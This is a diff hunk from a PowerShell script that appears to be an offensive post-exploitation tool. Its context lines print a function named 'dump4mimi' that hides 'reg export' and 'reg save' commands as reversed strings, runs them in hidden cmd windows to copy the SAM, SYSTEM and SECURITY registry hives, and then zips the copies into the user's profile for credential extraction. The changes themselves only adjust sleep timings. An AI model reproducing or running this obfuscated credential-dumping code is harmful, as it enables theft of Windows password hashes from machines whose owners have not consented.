@@ -84,15 +84,15 @@ Set-Alias -Name getwifipass -Value getwifipass
 function dump4mimi {
         $ax3 = 'y/ "mas\:C" "mas\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(1.5)
+	sleep(1.2)
 	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(1.5)
+	sleep(1.3)
 	$ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
     Clear-Host
-    Start-Sleep -Seconds 3.5
-    Set-Location C:\
+    Start-Sleep -Seconds 4.5
+    cd C:\
     Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
     Start-Sleep -Seconds 0.5
     Clear-Host
